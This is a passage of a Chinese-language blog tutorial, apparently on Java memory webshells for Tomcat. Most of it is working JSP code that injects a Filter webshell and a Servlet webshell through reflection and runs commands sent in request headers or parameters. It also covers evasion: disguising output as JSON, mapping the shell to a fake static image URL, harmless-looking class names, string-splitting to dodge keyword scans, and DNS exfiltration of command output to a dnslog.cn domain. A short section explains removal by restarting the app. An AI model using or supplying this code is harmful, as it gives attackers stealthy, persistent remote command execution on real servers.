class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span>  (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//设置filterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterClass(Shellfilter.class.getName());<br>    filterDef.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shellfilter</span>());<br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">//设置filterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>); <span class="hljs-comment">//设置要映射的url</span><br>    filterMap.setDispatcher(DispatcherType.REQUEST.name()); <span class="hljs-comment">//设置分派类型,REQUEST表示普通的 HTTP 请求</span><br>    standardContext.addFilterMap(filterMap);<br><br>    <span class="hljs-comment">//将standardContext和filterDef放到filterConfig中</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">configclass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">configconstructor</span> <span class="hljs-operator">=</span> configclass.getDeclaredConstructor(Context.class,FilterDef.class);<br>    configconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">FilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (FilterConfig) configconstructor.newInstance(standardContext,filterDef);<br><br>    <span class="hljs-comment">//反射获取filterConfig</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">configsfield</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    configsfield.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) configsfield.get(standardContext);<br>    filterConfigs.put(<span class="hljs-string">&quot;Shellfilter&quot;</span>,filterConfig);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758691466247-1386dcb1-8e35-40fa-91f9-10bfcb2b9d30.png" srcset="/img/loading.gif" lazyload></p>
<p>还可以将回显伪装为json</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">bs64output</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(output.getBytes());<br><span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>servletResponse.setContentType(<span class="hljs-string">&quot;application/json;charset=UTF-8&quot;</span>);<br>out.print(<span class="hljs-string">&quot;&#123;\&quot;data\&quot;:\&quot;&quot;</span> + bs64output + <span class="hljs-string">&quot;\&quot;,\&quot;code\&quot;:200&#125;&quot;</span>);<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758693610397-ad9f077a-3889-4414-aab2-cea1d9dbad5a.png" srcset="/img/loading.gif" lazyload></p>
<ol start="4">
<li>伪装成静态资源请求，如<a target="_blank" rel="noopener" href="http://target.com/static/logo.png">http://target.com/static/logo.png</a></li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//设置filterMap</span><br><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>filterMap.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>filterMap.addURLPattern(<span class="hljs-string">&quot;/static/logo.png&quot;</span>); <span class="hljs-comment">//设置要映射的url</span><br>filterMap.setDispatcher(DispatcherType.REQUEST.name()); <span class="hljs-comment">//设置分派类型,REQUEST表示普通的 HTTP 请求</span><br>standardContext.addFilterMap(filterMap);<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758692240348-d944f629-dd8a-4570-88fe-85307df04389.png" srcset="/img/loading.gif" lazyload></p>
<ol start="5">
<li>filter类名伪装，用业务相关名绕过关键字扫描</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetricsFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span>   <span class="hljs-comment">// 伪装成监控 Filter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogTraceFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span>  <span class="hljs-comment">// 伪装成日志 Filter</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheControlFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span><br></code></pre></td></tr></table></figure>

<ol start="6">
<li>dns外带回显</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">domain</span> <span class="hljs-operator">=</span> Base64.getUrlEncoder().encodeToString(output.getBytes()).replace(<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;.kqrk9t.dnslog.cn&quot;</span>;<br>System.out.println(domain);<br><span class="hljs-keyword">try</span> &#123;<br>    InetAddress.getByName(domain); <span class="hljs-comment">// 触发 DNS 查询</span><br>&#125; <span class="hljs-keyword">catch</span> (Exception ignored) &#123;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758694626322-05b07bf9-75b6-4618-88b7-e4099af6876d.png" srcset="/img/loading.gif" lazyload></p>
<ol start="7">
<li>避免在代码中出现 <code>&quot;cmd.exe&quot;</code>、<code>&quot;sh&quot;</code>、<code>&quot;Runtime&quot; </code>等敏感词</li>
</ol>
<p>拼接</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;c&quot;</span> + <span class="hljs-string">&quot;m&quot;</span> + <span class="hljs-string">&quot;d&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">dot</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">exe</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;e&quot;</span> + <span class="hljs-string">&quot;x&quot;</span> + <span class="hljs-string">&quot;e&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">cmdExe</span> <span class="hljs-operator">=</span> c + dot + exe; <span class="hljs-comment">// &quot;cmd.exe&quot;</span><br></code></pre></td></tr></table></figure>

<p>动态传入，并base64编码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.net.InetAddress&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;shell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shellfilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-comment">//只处理http请求</span><br>            <span class="hljs-keyword">if</span> (!(servletRequest <span class="hljs-keyword">instanceof</span> HttpServletRequest)) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">encodedCmd</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;CMD&quot;</span>); <span class="hljs-comment">// 接收 Base64 编码的命令</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">encodedshell</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;Shell&quot;</span>);   <span class="hljs-comment">//获取命令解释器，sh/bash/cmd.exe</span><br>            System.out.println();<br>            <span class="hljs-comment">//为空时放行，不影响正常业务</span><br>            <span class="hljs-keyword">if</span> (encodedCmd == <span class="hljs-literal">null</span> || encodedCmd.trim().isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// Base64 解码</span><br>            <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(encodedCmd);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes).trim();<br><br>            <span class="hljs-type">byte</span>[] decodedBytes1 = Base64.getDecoder().decode(encodedshell);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes1).trim();<br><br>            <span class="hljs-keyword">if</span> (cmd.isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (shell.isEmpty()) &#123;<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>System.out.println(shell);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> !shell.contains(<span class="hljs-string">&quot;.&quot;</span>);<br><span class="hljs-comment">//            String osTyp = System.getProperty(&quot;os.name&quot;);</span><br><span class="hljs-comment">//            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="hljs-comment">//                isLinux = false;</span><br><span class="hljs-comment">//            &#125;</span><br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;shell, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;shell, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">bs64output</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(output.getBytes());<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(bs64output);<br><span class="hljs-comment">//            System.out.println(&quot;Shellfilter 执行命令结果: &quot; + output);</span><br>            out.flush();<br>            out.close();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//拿到standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span>  (ApplicationContext) applicationField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span>  (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//设置filterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterClass(Shellfilter.class.getName());<br>    filterDef.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shellfilter</span>());<br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">//设置filterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/static/logo.png&quot;</span>); <span class="hljs-comment">//设置要映射的url</span><br>    filterMap.setDispatcher(DispatcherType.REQUEST.name()); <span class="hljs-comment">//设置分派类型,REQUEST表示普通的 HTTP 请求</span><br>    standardContext.addFilterMap(filterMap);<br><br>    <span class="hljs-comment">//将standardContext和filterDef放到filterConfig中</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">configclass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">configconstructor</span> <span class="hljs-operator">=</span> configclass.getDeclaredConstructor(Context.class,FilterDef.class);<br>    configconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">FilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (FilterConfig) configconstructor.newInstance(standardContext,filterDef);<br><br>    <span class="hljs-comment">//反射获取filterConfig</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">configsfield</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    configsfield.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) configsfield.get(standardContext);<br>    filterConfigs.put(<span class="hljs-string">&quot;Shellfilter&quot;</span>,filterConfig);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1758695537137-64b38852-ed1b-42dd-b803-6c16e0d2132e.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="销毁内存马"><a href="#销毁内存马" class="headerlink" title="销毁内存马"></a>销毁内存马</h4><p>前面说到销毁内存马的本质是破坏挂载点。filter内存马的挂载点是filter链。</p>
<p>filter链在web应用启动时就被创建，而注入内存马是动态加入到filter链，只要重启web应用，filter链就会重新构建，filter内存马也就被销毁了，这只会影响当前web应用。重启tomcat也可，但是会影响别的web应用。</p>
<p><img src="/mdimg/javamemshell1/1757939507574-2fdc9d0b-d9cd-442e-bb7d-af23976e74ff.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="Servlet内存马"><a href="#Servlet内存马" class="headerlink" title="Servlet内存马"></a>Servlet内存马</h3><ul>
<li><strong>挂载点：</strong>Servlet 容器 (<code>ServletContext</code>)。</li>
<li><strong>原理：</strong>攻击者通过<code>ServletContext</code>的 API（如<code>addServlet</code>），动态注册一个恶意的<code>javax.servlet.Servlet</code>。这个恶意 Servlet 可以绑定到一个特定的 URL 路径，从而创建新的、隐蔽的后门路由。</li>
<li><strong>企业级危害：</strong>能够创建全新的、不显眼的访问路径，实现远程命令执行、文件上传/下载等功能。由于其不依赖现有业务逻辑，仅需知道新的 URL 路径即可访问，隐蔽性较强。</li>
</ul>
<h4 id="内存马注入-1"><a href="#内存马注入-1" class="headerlink" title="内存马注入"></a>内存马注入</h4><ul>
<li>正常情况下，Servlet 需要在 <code>web.xml</code> 中声明，或使用 <code>@WebServlet</code> 注解，在应用启动时由容器加载。</li>
<li>但 Tomcat 的 StandardContext（代表一个 Web 应用上下文）提供了 createWrapper()、addChild()、addServletMappingDecoded() 等方法，允许<strong>在运行时动态添加 Servlet</strong>。</li>
</ul>
<p>tomcat环境下的内存马</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br><br>&lt;%!<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell2Servlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>        <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>            isLinux = <span class="hljs-literal">false</span>;<br>        &#125;<br>        String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>        out.println(output);<br>        out.flush();<br>        out.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;&#125;<br> &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//通过反射获取applicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span>  (ApplicationContext) applicationField.get(servletContext);<br>    <span class="hljs-comment">//通过反射获取standardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span 